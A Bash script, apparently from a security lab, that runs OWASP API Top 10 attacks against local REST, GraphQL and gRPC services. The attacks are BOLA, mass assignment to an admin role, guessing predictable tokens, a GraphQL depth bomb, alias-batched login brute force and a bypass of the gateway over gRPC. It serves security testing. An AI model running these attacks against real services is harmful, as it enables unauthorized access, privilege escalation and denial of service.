#!/bin/bash
set -e
ETIQUETA=${1:-manual}

# Endpoints reales mapeados en docker-compose
REST_BASE="http://localhost:8080"
GQL_URL="http://localhost:4000/graphql"
GRPC_HOST="127.0.0.1" 
GRPC_PUERTO=50051

echo "== Rol 4: corrida [$ETIQUETA] =========================================="

# 1) Registrar usuario de prueba y obtener token
echo "-- Registrando usuario y obteniendo token --"
curl -s -X POST "$REST_BASE/api/v1/registro" \
  -H "Content-Type: application/json" \
  -d '{"nombre":"atacante","correo":"atac@test.com","password":"x"}' > /dev/null || true

LOGIN=$(curl -s -X POST "$REST_BASE/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"correo":"atac@test.com","password":"x"}')

TOKEN=$(echo "$LOGIN" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
if [ -z "$TOKEN" ]; then
    echo "Error: No se pudo obtener el token."
    exit 1
fi
TOKEN="Bearer $TOKEN"
echo "Token obtenido: $TOKEN"

echo "-- API1 BOLA (intentar acceder a usuario usr-1) --"
# Truco: al no usar {id}, el script concatena la plantilla con el número, 
# resultando en /api/v1/usuarios/usr-1, que es el ID real que genera el servicio.
./rest_bola "$REST_BASE" "/api/v1/usuarios/usr-" "$TOKEN" 1 1 || true

echo "-- API3 Mass assignment (intentar escalar rol a admin en usr-1) --"
./rest_mass_assignment "$REST_BASE/api/v1/usuarios/usr-1" "$TOKEN" \
    nombre="hacker" rol="admin" || true

echo "-- API2 Auth debil (sin token) --"
./rest_auth_debil sin-token "$REST_BASE/api/v1/perfil" || true

echo "-- API2 Auth debil (adivinar token predecible) --"
./rest_auth_debil adivinar "$REST_BASE/api/v1/perfil" "tok-usr-1-" 1 20 || true

echo "-- API8 Introspeccion GraphQL --"
./graphql_introspection "$GQL_URL" "$TOKEN" || true

echo "-- API4 Bomba de profundidad GraphQL --"
./graphql_depth_bomb "$GQL_URL" subasta vendedor.subastas 300 || true

echo "-- API6 Alias batch en login GraphQL --"
yes "x" | head -n 100 > /tmp/dic.txt
./graphql_alias_batch "$GQL_URL" "atac@test.com" /tmp/dic.txt 50 || true

echo "-- API9 gRPC reflection --"
./grpc_reflection "$GRPC_HOST" "$GRPC_PUERTO" || true

echo "-- API5 gRPC bypass del gateway (Pujar directo, sin token) --"
./grpc_bypass_gateway "$GRPC_HOST" "$GRPC_PUERTO" subasta-demo usuario-atacante 100000 || true

echo "== listo, ver results.csv ==============================================="